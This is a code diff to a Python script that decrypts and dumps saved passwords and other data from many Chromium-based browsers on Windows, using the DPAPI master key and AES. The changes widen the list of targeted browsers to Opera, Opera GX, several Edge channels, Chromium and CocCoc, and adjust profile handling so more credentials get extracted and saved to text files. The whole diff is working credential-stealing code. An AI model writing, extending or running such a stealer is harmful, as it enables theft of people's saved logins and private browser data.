@@ -9,6 +9,7 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 appdata = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
 
 browsers = {
     'avast': appdata + '\\AVAST Software\\Browser\\User Data',
@@ -20,14 +21,21 @@ browsers = {
     '7star': appdata + '\\7Star\\7Star\\User Data',
     'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
     'vivaldi': appdata + '\\Vivaldi\\User Data',
-    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
-    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+    'chromium': appdata + '\\Chromium\\User Data',
+    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
+    'chrome': appdata + '\\Google\\Chrome\\User Data',
     'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
-    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
+    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
+    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
+    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
     'uran': appdata + '\\uCozMedia\\Uran\\User Data',
     'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
     'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
     'iridium': appdata + '\\Iridium\\User Data',
+    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
+    'opera': roaming + '\\Opera Software\\Opera Stable',
+    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
 }
 
 data_queries = {
@@ -94,7 +102,7 @@ def decrypt_password(buff: bytes, key: bytes) -> str:
 def save_results(browser_name, type_of_data, content):
     if not os.path.exists(browser_name):
         os.mkdir(browser_name)
-    if content != "":
+    if content != "" and content != None:
         open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
         print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
     else:
@@ -153,6 +161,10 @@ if __name__ == '__main__':
 
         for data_type_name, data_type in data_queries.items():
             print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
-            data = get_data(browser_path, "Default", master_key, data_type)
+            notdefault = ['opera-gx'] # Browsers that we do not specify "Default" for profile
+            profile = "Default"
+            if browser in notdefault:
+                profile = ""
+            data = get_data(browser_path, profile, master_key, data_type)
             save_results(browser, data_type_name, data)
             print("\t------\n")
